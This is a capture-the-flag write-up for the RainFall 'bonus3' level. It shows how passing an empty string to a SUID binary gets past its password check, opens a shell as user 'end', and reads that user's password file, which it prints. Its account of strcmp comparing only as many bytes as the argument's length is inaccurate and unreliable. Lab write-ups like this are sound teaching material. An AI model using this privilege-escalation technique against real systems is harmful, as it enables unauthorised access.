# Level bonus 3

## Vulnerability

```strcmp()``` with empty argument

## Context

We find a binary with owner ```end``` and SUID.
```
bonus3@RainFall:~$ ls -l
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
```
When run with 1 argument, it prints a new line. Run with 0 or >1 arguments it does nothing.
```
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 Yes!

bonus3@RainFall:~$ ./bonus3 No no
bonus3@RainFall:~$ ./bonus3 No no no
bonus3@RainFall:~$
```

## Solution

In summary, if you give the password for user ```end``` as argument to ```bonus3```, it opens a shell (well actually it segfaults).

But we don't know the password yet so...

Investigating with gdb we find just ```main()```. ```main()``` opens ```/home/user/end/.pass``` and copies the password into a buffer twice. Then ```strcmp()``` compares the buffer and argv[1], opening a shell if you have provided the matching password. However ```strcmp()``` will only read and compare as many bytes as len(argv[1]), so if we provide an empty string ```strcmp()``` returns 0, claiming the password and empty string are the same (for as many bytes as read - 0).
```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
bonus3@RainFall:~$ su end
Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
end@RainFall:~$ ls -l
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
```
Maybe should have used ```strncmp()``` instead of ```strcmp()```.

Anways Congratulations graduate!
